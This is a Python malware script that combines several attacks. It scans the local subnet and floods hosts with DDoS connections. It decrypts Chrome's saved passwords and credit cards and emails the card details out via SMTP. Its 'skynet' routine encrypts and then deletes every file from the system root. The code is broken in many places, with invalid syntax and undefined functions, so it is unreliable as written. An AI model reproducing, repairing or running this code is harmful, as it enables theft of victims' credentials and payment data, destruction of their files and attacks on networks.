# import required module
from encrypt import get_key, encrypt
import os
import sys
import elevate
import socket
import threading
import random 
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import smtplib

elevate()

fake_ip = '192.168.2.' + random.randint(2, 255)
port = 80

net = 192.168.1.1
net1 = net.split('.')
a = '.'

net2 = net1[0] + a + net1[1] + a + net1[2] + a
st1 = 1
en1 = 256
en1 = en1 + 1
global targets = []

def find_root():
    path = sys.executable
    while os.path.split(path)[1]:
        path = os.path.split(path)[0]
    return path

def skynet():
  Root_DIR = find_root()
  result = []
  Key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
  counter = 10
  
  for root, dirs, files in os.walk(Root_DIR):
    if file != "Search_Destroy.py":
          for file in files:
              result.append(os.path.join(root, file))
      return result

  while counter != 0:
    for file in get_files(Root_DIR):
            encrypt(get_key(Key), file)
    counter = counter - 1

  while file in Root_DIR:
    for file in get_files(Root_DIR):
      os.remove(file)
  
def DDOS(target):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

def scan(addr):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   socket.setdefaulttimeout(1)
   result = s.connect_ex((addr,135))
   if result == 0:
      return 1
   else :
      return 0

def run1():
   for ip in range(st1,en1):
      addr = net2 + str(ip)
      if (scan(addr)):
         targets.append(addr)
    DDOS(targets)

def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def PSWD_main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
      
    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")
          
        else:
            continue
          
        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
          
        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        os.remove(filename)
    except:
        pass

def get_credit_cards():
    master_key = get_master_key()
    login_db = os.environ[
                   'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                     "CCvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            Card_details = "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(
                    expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n")
            sender_mail = 'ENTER YOUR EMAIL'    
            receivers_mail = ['ENTER RECIPIENT']    
            message = f"""From: From Person %s  
            To: To Person %s  
            Subject: Credit Cards   
            {Card_details}  
            """%(sender_mail,receivers_mail)    
            try:    
                password = 'GMAIL PASSWORD'
                smtpObj = smtplib.SMTP("gmail.com", 587)   
                smtpObj.sendmail(sender_mail, receivers_mail, message)      
            except Exception:
                continue    

    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except Exception as e:
        pass

try:
    get_password()
    get_credit_cards()
except:
    continue

for target in targets:
    for i in range(500):
        thread = threading.Thread(target=run1)
        thread.start()

thread2 = threading.Thread(target=skynet)
thread2.start()